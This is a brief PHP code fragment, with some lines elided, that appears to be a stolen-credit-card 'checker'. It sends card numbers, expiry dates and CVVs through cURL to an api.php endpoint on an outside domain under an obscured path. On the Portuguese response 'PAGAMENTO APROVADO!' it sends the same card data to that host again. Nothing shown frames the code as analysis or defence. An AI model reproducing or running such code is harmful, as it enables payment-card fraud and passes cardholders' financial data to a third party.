...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://filhotemlkfull.com/ajaksfisahdfikda-i4235423nas-isdha732tst/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
...
if(strpos($r0, 'PAGAMENTO APROVADO!')) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://filhotemlkfull.com/ajaksfisahdfikda-i4235423nas-isdha732tst/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
